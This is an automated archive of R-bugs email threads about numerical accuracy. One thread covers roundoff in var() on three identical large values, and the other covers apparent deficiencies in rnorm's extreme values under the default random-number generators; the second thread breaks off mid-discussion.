=================================================
This is an automated collection of open reports in
the R-bugs repository.
=================================================

Directory:  Accuracy

* PR# 1228 *
Subject: bug with var(rep(1e30, 3))
From: Emmanuel Paradis <paradis@isem.univ-montp2.fr>
Date: Wed, 26 Dec 2001 13:03:31 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1228 <==
From postmaster@franz.stat.wisc.edu  Wed Dec 26 13:07:55 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA13232
	for <r-bugs@biostat.ku.dk>; Wed, 26 Dec 2001 13:07:55 +0100 (MET)
Received: from isem.isem.univ-montp2.fr (really [162.38.183.200]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16JCqF-000IZvC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Wed, 26 Dec 2001 06:07:27 -0600 (CST) 
Received: from diversi (diversi.isem.univ-montp2.fr [162.38.183.45])
	by isem.isem.univ-montp2.fr (8.9.1b+Sun/8.9.1) with SMTP id MAA19343
	for <r-bugs@r-project.org>; Wed, 26 Dec 2001 12:58:33 +0100 (MET)
Message-Id: <3.0.32.20011226130330.00910b80@162.38.183.200>
X-Sender: paradis@162.38.183.200
X-Mailer: Windows Eudora Pro Version 3.0 (32)
Date: Wed, 26 Dec 2001 13:03:31 +0100
To: r-bugs@r-project.org
From: Emmanuel Paradis <paradis@isem.univ-montp2.fr>
Subject: bug with var(rep(1e30, 3))
Mime-Version: 1.0
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id NAA13232

There seems to be a bug with var() when the argument is a vector with
exactly three values of 1e30 (or close to this value). This does not happen
with twice, four (or more) times this value, or another value.


> var(rep(1e30, 3))
[1] 2.971056e+28
> var(rep(1.2e30, 3))
[1] 2.971056e+28
> var(rep(0.9e30, 3))
[1] 2.971056e+28
> var(rep(0.8e30, 3))
[1] 0
> var(rep(1e29, 3))
[1] 0
> var(rep(1e30, 2))
[1] 0
> var(rep(1e30, 4))
[1] 0
> var(rep(1e31, 3))
[1] 0


The bug is repeatable, and I got the same results with R 1.3.1 (binary from
CRAN) and R 1.4.0 (binary from BD Ripley's site) both on Windows NT, and R
1.4.0 on Solaris (compiled from sources).



Emmanuel Paradis
Laboratoire de Paléontologie
Institut des Sciences de l'Évolution
Université Montpellier II
F-34095 Montpellier cédex 05
France
   phone: +33  4 67 14 39 64
     fax: +33  4 67 14 36 10
  mailto:paradis@isem.univ-montp2.fr

==> 1228.reply.1 <==
From p.dalgaard@biostat.ku.dk  Wed Dec 26 15:32:38 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA13516;
	Wed, 26 Dec 2001 15:32:38 +0100 (MET)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id fBQEVRP24017;
	Wed, 26 Dec 2001 15:31:27 +0100
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: paradis@isem.univ-montp2.fr
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] bug with var(rep(1e30, 3)) (PR#1228)
References: <200112261207.NAA13242@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 26 Dec 2001 15:31:27 +0100
In-Reply-To: <200112261207.NAA13242@pubhealth.ku.dk>
Message-ID: <x2heqet5mo.fsf@blueberry.kubism.ku.dk>
Lines: 56
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

paradis@isem.univ-montp2.fr writes:

> There seems to be a bug with var() when the argument is a vector with
> exactly three values of 1e30 (or close to this value). This does not happen
> with twice, four (or more) times this value, or another value.
> 
> 
> > var(rep(1e30, 3))
> [1] 2.971056e+28
> > var(rep(1.2e30, 3))
> [1] 2.971056e+28
> > var(rep(0.9e30, 3))
> [1] 2.971056e+28
> > var(rep(0.8e30, 3))
> [1] 0
> > var(rep(1e29, 3))
> [1] 0
> > var(rep(1e30, 2))
> [1] 0
> > var(rep(1e30, 4))
> [1] 0
> > var(rep(1e31, 3))
> [1] 0
> 
> 
> The bug is repeatable, and I got the same results with R 1.3.1 (binary from
> CRAN) and R 1.4.0 (binary from BD Ripley's site) both on Windows NT, and R
> 1.4.0 on Solaris (compiled from sources).

Not a bug, roundoff:

> (1e30+1e30+1e30)/3-1e30
[1] 1.407375e+14
> 3*((1e30+1e30+1e30)/3-1e30)^2/2
[1] 2.971056e+28

Relative errors of the order 1e-16 are completely expectable in
floating point arithmetic.

For illustration, look at it in octal, after removing a bunch of
trailing zeroes:

> x<-1e30/(8^16)
> structure(x, class="octmode")
[1] "144762623464043165"
> structure(x+x+x, class="octmode")
[1] "456730272634151540"

If you look carefully, you will see that a bit is lost in the process
since 5+5+5 is 17 octal.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1228.followup.1 <==
From ripley@stats.ox.ac.uk  Wed Dec 26 16:52:52 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA13677;
	Wed, 26 Dec 2001 16:52:51 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id PAA29226;
	Wed, 26 Dec 2001 15:52:25 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id fBQFqPg12750;
	Wed, 26 Dec 2001 15:52:25 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Wed, 26 Dec 2001 15:52:25 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
cc: <paradis@isem.univ-montp2.fr>, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] bug with var(rep(1e30, 3)) (PR#1228)
In-Reply-To: <x2heqet5mo.fsf@blueberry.kubism.ku.dk>
Message-ID: <Pine.LNX.4.31.0112261550130.12728-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

But there are better algorithms that are not subject to this sort
of rounding error.

I reckon that computing a variance this way is not the quality of
algorithm one should expect from R.

On 26 Dec 2001, Peter Dalgaard BSA wrote:

> paradis@isem.univ-montp2.fr writes:
>
> > There seems to be a bug with var() when the argument is a vector with
> > exactly three values of 1e30 (or close to this value). This does not happen
> > with twice, four (or more) times this value, or another value.
> >
> >
> > > var(rep(1e30, 3))
> > [1] 2.971056e+28
> > > var(rep(1.2e30, 3))
> > [1] 2.971056e+28
> > > var(rep(0.9e30, 3))
> > [1] 2.971056e+28
> > > var(rep(0.8e30, 3))
> > [1] 0
> > > var(rep(1e29, 3))
> > [1] 0
> > > var(rep(1e30, 2))
> > [1] 0
> > > var(rep(1e30, 4))
> > [1] 0
> > > var(rep(1e31, 3))
> > [1] 0
> >
> >
> > The bug is repeatable, and I got the same results with R 1.3.1 (binary from
> > CRAN) and R 1.4.0 (binary from BD Ripley's site) both on Windows NT, and R
> > 1.4.0 on Solaris (compiled from sources).
>
> Not a bug, roundoff:
>
> > (1e30+1e30+1e30)/3-1e30
> [1] 1.407375e+14
> > 3*((1e30+1e30+1e30)/3-1e30)^2/2
> [1] 2.971056e+28
>
> Relative errors of the order 1e-16 are completely expectable in
> floating point arithmetic.
>
> For illustration, look at it in octal, after removing a bunch of
> trailing zeroes:
>
> > x<-1e30/(8^16)
> > structure(x, class="octmode")
> [1] "144762623464043165"
> > structure(x+x+x, class="octmode")
> [1] "456730272634151540"
>
> If you look carefully, you will see that a bit is lost in the process
> since 5+5+5 is 17 octal.
>
> --
>    O__  ---- Peter Dalgaard             Blegdamsvej 3
>   c/ /'_ --- Dept. of Biostatistics     2200 Cph. N
>  (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
> ~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1228.reply.2 <==
From p.dalgaard@biostat.ku.dk  Wed Dec 26 18:01:10 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA13867;
	Wed, 26 Dec 2001 18:01:10 +0100 (MET)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id fBQGxxE24151;
	Wed, 26 Dec 2001 17:59:59 +0100
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: Prof Brian Ripley <ripley@stats.ox.ac.uk>
Cc: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>,
        <paradis@isem.univ-montp2.fr>, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] bug with var(rep(1e30, 3)) (PR#1228)
References: <Pine.LNX.4.31.0112261550130.12728-100000@gannet.stats>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 26 Dec 2001 17:59:59 +0100
In-Reply-To: <Pine.LNX.4.31.0112261550130.12728-100000@gannet.stats>
Message-ID: <x2vgetrk6o.fsf@blueberry.kubism.ku.dk>
Lines: 33
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Prof Brian Ripley <ripley@stats.ox.ac.uk> writes:

> But there are better algorithms that are not subject to this sort
> of rounding error.
> 
> I reckon that computing a variance this way is not the quality of
> algorithm one should expect from R.

Hmm. Which algorithms are there? Surely almost any kind of provisional
means subtraction could avoid the the extreme case where the mean of a
bunch of identical numbers is different from all of them, but will it
also improve precision in the general case?

Essentially our current algorithm in cov.c is

xm<- sum(x)/n
v <- 1/(n-1)*sum((x-xm)^2)

> > > x<-1e30/(8^16)
> > > structure(x, class="octmode")
> > [1] "144762623464043165"
> > > structure(x+x+x, class="octmode")
> > [1] "456730272634151540"
> >
> > If you look carefully, you will see that a bit is lost in the process
> > since 5+5+5 is 17 octal.


-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1228.audit <==
Fri Dec 28 20:08:08 2001	thomas	moved from incoming to Accuracy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1664 *
Subject: Bug in rnorm.
From: Rolf Turner <rolf@math.unb.ca>
Date: Thu, 13 Jun 2002 16:35:59 -0300 (ADT)
--Strange interaction between "Marsaglia-Multicarry" generator and
--"Kinderman-Ramage" 
--method for normal variates. Apparently, switching either of them will help.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1664 <==
From rolf@math.unb.ca  Thu Jun 13 21:36:41 2002
Received: from gelfand.math.unb.ca (gelfand.math.unb.ca [131.202.168.201])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA25186
	for <r-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 21:36:40 +0200 (MET DST)
Received: (from rolf@localhost)
	by gelfand.math.unb.ca (8.9.3/8.9.3) id QAA04336
	for r-bugs@biostat.ku.dk; Thu, 13 Jun 2002 16:35:59 -0300 (ADT)
Date: Thu, 13 Jun 2002 16:35:59 -0300 (ADT)
From: Rolf Turner <rolf@math.unb.ca>
Message-Id: <200206131935.QAA04336@gelfand.math.unb.ca>
To: r-bugs@biostat.ku.dk
Subject: Bug in rnorm.


There appears to be a mild bug, or at least a deficiency, in
rnorm.  The bug becomes apparent when one looks at extremes
of the squares of the values generated by rnorm; rnorm is not
generating quite enough extreme values.

The R version that I am using is 1.4.1; I never got around to installing
1.5.0, and now since 1.5.1 is about to come out ....  However, checking
the 1.5.0 release notes revealed no mention of fixing a bug in rnorm.

Version details:

platform sparc-sun-solaris2.7
arch     sparc               
os       solaris2.7          
system   sparc, solaris2.7   
status                       
major    1                   
minor    4.1                 
year     2002                
month    01                  
day      30                  
language R

More detail regarding how the bug revealed itself:
==================================================

	For n = 100, 200, ..., 1500

	o I generated 1000 sequences of length n via rnorm(n),

	o for each sequence x, I calculated m = the max of x^2

	o I then calculated pval = 1 - pchisq(m,1)^n

	o I then calculated s.hat.n = #{pval: pval < 0.05}/1000

I then plotted s.hat.n versus n.  This ***should*** give a result
close to a horizontal straight line, at height 0.05 --- but it
didn't.  For the larger values of n, the values of s.hat.n were
displaced significantly below 0.05.

After some discussion with colleagues, I replaced the calls to rnorm()
by calls to myrnorm() defined by

	myrnorm <- function(n,mu=0,sigma=1){
		mu + sigma*cos(2*pi*runif(n))*sqrt(-2*log(runif(n)))
	}

which uses the ``(r,theta)'' method of generating random normals.

When I did so, the resulting values were indeed all ``close to'' 0.05,
as they should be.

I also tried the experiment using rchisq(n,1) instead of rnorm(n) (and
then of course taking m = max of x --- rather than max of x^2).  Again
all the resulting values were close to 0.05 as ought to be the case.
(So rchisq() appears to be OK in this regard.)

Enclosed below is a script to demonstrate the bug.

					cheers,

						Rolf Turner
						rolf@math.unb.ca

#==+===+===+===+===+===+===+===+===+===+===+===+===+===+===+===+===+===+===
#
# Script to demonstrate the bug in rnorm.
#
myrnorm <- function(n,mu=0,sigma=1){
	mu + sigma*cos(2*pi*runif(n))*sqrt(-2*log(runif(n)))
}

# If RFUN <- rnorm we get ``wrong'' answers; if RFUN <- myrnorm,
# we get ``right'' answers.
RFUN <- rnorm

NSER <- 1000
set.seed(350734)
rslt <- list()

for(K in 1:15) {
	N   <- 100*K
	M   <- matrix(RFUN(NSER*N),N,NSER)
	T2  <- apply(M,2,function(x){max(x**2)})
	PV  <- 1 - pchisq(T2,1)**N
	SZ  <- sum(PV < 0.05)/NSER
	rslt[[K]] <- SZ
	cat(K,"\n")
}

rslt <- unlist(rslt)
plot(100*(1:15),rslt,ylim=c(0,0.1),xlab='n',ylab='s.hat.n')
abline(h=0.05)
error.bar(100*(1:15),rslt,lower=1.96*sqrt(0.05*0.95/1000),add=TRUE)

# Clean up:
rm(RFUN,NSER,K,N,M,T2,PV,SZ)
#==+===+===+===+===+===+===+===+===+===+===+===+===+===+===+===+===+===+===

==> 1664.reply.1 <==
From p.dalgaard@biostat.ku.dk  Thu Jun 13 23:59:51 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA25689;
	Thu, 13 Jun 2002 23:59:49 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g5DLxi720304;
	Thu, 13 Jun 2002 23:59:44 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: rolf@math.unb.ca
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: Bug in rnorm. (PR#1664)
References: <200206131936.VAA25196@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 13 Jun 2002 23:59:43 +0200
In-Reply-To: <200206131936.VAA25196@pubhealth.ku.dk>
Message-ID: <x2lm9ion5c.fsf@blueberry.kubism.ku.dk>
Lines: 39
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

rolf@math.unb.ca writes:

> There appears to be a mild bug, or at least a deficiency, in
> rnorm.  The bug becomes apparent when one looks at extremes
> of the squares of the values generated by rnorm; rnorm is not
> generating quite enough extreme values.
> 
> The R version that I am using is 1.4.1; I never got around to installing
> 1.5.0, and now since 1.5.1 is about to come out ....  However, checking
> the 1.5.0 release notes revealed no mention of fixing a bug in rnorm.

...and I see the effect too with an r-patched from a few days back.


[snip]
> After some discussion with colleagues, I replaced the calls to rnorm()
> by calls to myrnorm() defined by
> 
> 	myrnorm <- function(n,mu=0,sigma=1){
> 		mu + sigma*cos(2*pi*runif(n))*sqrt(-2*log(runif(n)))
> 	}
> 
> which uses the ``(r,theta)'' method of generating random normals.
> 
> When I did so, the resulting values were indeed all ``close to'' 0.05,
> as they should be.
> 
> I also tried the experiment using rchisq(n,1) instead of rnorm(n) (and
> then of course taking m = max of x --- rather than max of x^2).  Again
> all the resulting values were close to 0.05 as ought to be the case.
> (So rchisq() appears to be OK in this regard.)

Also qnorm(runif(n)) seems to be closer to the target.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1664.reply.2 <==
From p.dalgaard@biostat.ku.dk  Fri Jun 14 00:39:40 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA25799;
	Fri, 14 Jun 2002 00:39:40 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g5DMdZS21724;
	Fri, 14 Jun 2002 00:39:35 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: rolf@math.unb.ca, R-bugs@biostat.ku.dk
Subject: Re: Bug in rnorm. (PR#1664)
References: <200206131936.VAA25196@pubhealth.ku.dk>
	<x2lm9ion5c.fsf@blueberry.kubism.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 14 Jun 2002 00:39:35 +0200
In-Reply-To: <x2lm9ion5c.fsf@blueberry.kubism.ku.dk>
Message-ID: <x23cvqst08.fsf@blueberry.kubism.ku.dk>
Lines: 27
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk> writes:

> rolf@math.unb.ca writes:
> 
> > There appears to be a mild bug, or at least a deficiency, in
> > rnorm.  The bug becomes apparent when one looks at extremes
> > of the squares of the values generated by rnorm; rnorm is not
> > generating quite enough extreme values.
> > 
> > The R version that I am using is 1.4.1; I never got around to installing
> > 1.5.0, and now since 1.5.1 is about to come out ....  However, checking
> > the 1.5.0 release notes revealed no mention of fixing a bug in rnorm.
> 
> ...and I see the effect too with an r-patched from a few days back.

No I do not! My quick check code took the square of the max rather
than the max of the square...

With your script, I get a nice horizontal line both with 1.4.0 and
1.5.0-patched.

(RedHat Linux 7.1 on a PC) 
-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1664.followup.1 <==
From dmurdoch@pair.com  Fri Jun 14 03:03:58 2002
Received: from tomts22-srv.bellnexxia.net (tomts22.bellnexxia.net [209.226.175.184])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id DAA26095;
	Fri, 14 Jun 2002 03:03:57 +0200 (MET DST)
Received: from djmfuj ([216.209.253.120]) by tomts22-srv.bellnexxia.net
          (InterMail vM.5.01.04.19 201-253-122-122-119-20020516) with SMTP
          id <20020614010315.TTYC25645.tomts22-srv.bellnexxia.net@djmfuj>;
          Thu, 13 Jun 2002 21:03:15 -0400
From: Duncan Murdoch <dmurdoch@pair.com>
To: p.dalgaard@biostat.ku.dk
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: Bug in rnorm. (PR#1664)
Date: Thu, 13 Jun 2002 21:03:16 -0400
Message-ID: <vueigucgpfqqvp7p8smsnn29cvgit5icka@4ax.com>
References: <200206132239.AAA25804@pubhealth.ku.dk>
In-Reply-To: <200206132239.AAA25804@pubhealth.ku.dk>
X-Mailer: Forte Agent 1.91/32.564
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

On Fri, 14 Jun 2002 00:39:58 +0200 (MET DST), p.dalgaard@biostat.ku.dk
wrote:

>With your script, I get a nice horizontal line both with 1.4.0 and
>1.5.0-patched.
>
>(RedHat Linux 7.1 on a PC) 

I get what Rolf described in 1.5.0-patched for Windows with the
default generators: 

RNGkind()
[1] "Marsaglia-Multicarry" "Kinderman-Ramage"  

I switched to the Ahrens-Dieter normal RNG (using
RNGkind(,'Ahrens-Dieter')), and things were fine.  

Keeping the default normal generator but switching to the
Mersenne-Twister uniform also fixed it:

> RNGkind()
[1] "Mersenne-Twister" "Kinderman-Ramage"

Is it possible you're not using the default generators?  If you are,
this is quite weird, because we're on the same hardware.  Why would
the OS or compiler matter in a calculation like this??

Duncan Murdoch

==> 1664.followup.2 <==
From ripley@stats.ox.ac.uk  Fri Jun 14 09:24:08 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA27314;
	Fri, 14 Jun 2002 09:24:07 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id IAA18202;
	Fri, 14 Jun 2002 08:23:26 +0100 (BST)
Date: Fri, 14 Jun 2002 08:23:26 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
cc: <rolf@math.unb.ca>, <R-bugs@biostat.ku.dk>
Subject: Re: Bug in rnorm. (PR#1664)
In-Reply-To: <x2lm9ion5c.fsf@blueberry.kubism.ku.dk>
Message-ID: <Pine.LNX.4.31.0206140821280.6308-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

R supplies a choice of random-number generators as well as a choice of
generating normals.  All methods are compromises, and I suspect one of the
non-default ones may be better for your purposes.  Please investigate the
choices.


On 13 Jun 2002, Peter Dalgaard BSA wrote:

> rolf@math.unb.ca writes:
>
> > There appears to be a mild bug, or at least a deficiency, in
> > rnorm.  The bug becomes apparent when one looks at extremes
> > of the squares of the values generated by rnorm; rnorm is not
> > generating quite enough extreme values.
> >
> > The R version that I am using is 1.4.1; I never got around to installing
> > 1.5.0, and now since 1.5.1 is about to come out ....  However, checking
> > the 1.5.0 release notes revealed no mention of fixing a bug in rnorm.
>
> ...and I see the effect too with an r-patched from a few days back.
>
>
> [snip]
> > After some discussion with colleagues, I replaced the calls to rnorm()
> > by calls to myrnorm() defined by
> >
> > 	myrnorm <- function(n,mu=0,sigma=1){
> > 		mu + sigma*cos(2*pi*runif(n))*sqrt(-2*log(runif(n)))
> > 	}
> >
> > which uses the ``(r,theta)'' method of generating random normals.
> >
> > When I did so, the resulting values were indeed all ``close to'' 0.05,
> > as they should be.
> >
> > I also tried the experiment using rchisq(n,1) instead of rnorm(n) (and
> > then of course taking m = max of x --- rather than max of x^2).  Again
> > all the resulting values were close to 0.05 as ought to be the case.
> > (So rchisq() appears to be OK in this regard.)
>
> Also qnorm(runif(n)) seems to be closer to the target.
>
> --
>    O__  ---- Peter Dalgaard             Blegdamsvej 3
>   c/ /'_ --- Dept. of Biostatistics     2200 Cph. N
>  (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
> ~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1664.reply.3 <==
From p.dalgaard@biostat.ku.dk  Fri Jun 14 10:14:33 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA28084;
	Fri, 14 Jun 2002 10:14:33 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g5E8EUI22113;
	Fri, 14 Jun 2002 10:14:30 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: Duncan Murdoch <dmurdoch@pair.com>
Cc: p.dalgaard@biostat.ku.dk, r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: Bug in rnorm. (PR#1664)
References: <200206132239.AAA25804@pubhealth.ku.dk>
	<vueigucgpfqqvp7p8smsnn29cvgit5icka@4ax.com>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 14 Jun 2002 10:14:29 +0200
In-Reply-To: <vueigucgpfqqvp7p8smsnn29cvgit5icka@4ax.com>
Message-ID: <x27kl2cm56.fsf@blueberry.kubism.ku.dk>
Lines: 101
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Duncan Murdoch <dmurdoch@pair.com> writes:

> On Fri, 14 Jun 2002 00:39:58 +0200 (MET DST), p.dalgaard@biostat.ku.dk
> wrote:
> 
> >With your script, I get a nice horizontal line both with 1.4.0 and
> >1.5.0-patched.
> >
> >(RedHat Linux 7.1 on a PC) 
> 
> I get what Rolf described in 1.5.0-patched for Windows with the
> default generators: 
> 
> RNGkind()
> [1] "Marsaglia-Multicarry" "Kinderman-Ramage"  
> 
> I switched to the Ahrens-Dieter normal RNG (using
> RNGkind(,'Ahrens-Dieter')), and things were fine.  
> 
> Keeping the default normal generator but switching to the
> Mersenne-Twister uniform also fixed it:
> 
> > RNGkind()
> [1] "Mersenne-Twister" "Kinderman-Ramage"
> 
> Is it possible you're not using the default generators?  If you are,
> this is quite weird, because we're on the same hardware.  Why would
> the OS or compiler matter in a calculation like this??
> 
> Duncan Murdoch
> 

Now this is pretty darn odd....

This is what happened to me yesterday with 1.4.0:

[Previously saved workspace restored]

> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 39
> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 37
> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 63
> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 50
> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 51
> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 51

This morning, I get

> RNGkind()
[1] "Marsaglia-Multicarry" "Kinderman-Ramage"    
> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 27
> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 23
> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 29
> m <- sapply(1:1000, function(i)max(rnorm(1500)^2))
> sum( 1 - pchisq(m,1)^1500 < .05)
[1] 29

with the SAME version of R. The only difference is the startup
directory, and hence the saved workspace. This contains:

> ls(all=T)
[1] ".Random.seed" "x"            "y"           
> .Random.seed
[1]     0 25300 11635 10783

